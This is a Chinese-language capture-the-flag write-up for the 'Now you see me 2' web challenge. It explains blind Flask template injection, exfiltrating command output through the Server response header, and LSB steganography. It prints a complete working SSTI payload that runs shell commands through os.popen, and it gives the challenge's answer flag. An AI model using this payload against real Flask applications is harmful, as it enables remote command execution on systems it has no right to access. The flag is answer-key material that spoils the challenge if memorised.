# Now you see me 2

> 分类：Web

## 题目描述

Now you see me 1 的无回显版。ban 了时间盲注、弹 shell、内存马，flag 是 LSB 隐写的 PNG。

## 考察知识点

- Flask SSTI 无回显
- 请求头回显（WSGIRequestHandler.server_version）
- LSB 隐写

## 解法

与第 1 题类似，但无回显。利用**请求头回显**：把命令执行结果写进 `WSGIRequestHandler` 的 `server_version` 属性，随响应 Server 头回显：

```
{%print(g|attr('pop')|attr('__globals__')|attr('get')('__builtins__')|attr('get')('setattr')(g|attr('pop')|attr('__globals__')|attr('get')('sys')|attr('modules')|attr('get')('werkzeug')|attr('serving')|attr('WSGIRequestHandler'),'server_version',g|attr('pop')|attr('__globals__')|attr('get')('__builtins__')|attr('get')('__import__')('os')|attr('popen')('<cmd>')|attr('read')()))%}
```

下载 flag 文件（PNG 头），用在线 LSB 隐写工具解密：

```
https://toolgg.com/image-decoder.html
```

## 参考答案

`flag{__M@g1c1@ans_M@stering_M@g1c__}`

## 来源

- 作者：LamentXU（出题人） | https://www.cnblogs.com/LAMENTXU/articles/18730353
- 作者：竹言笙熙 | https://blog.csdn.net/oyf3085227433/article/details/147075769
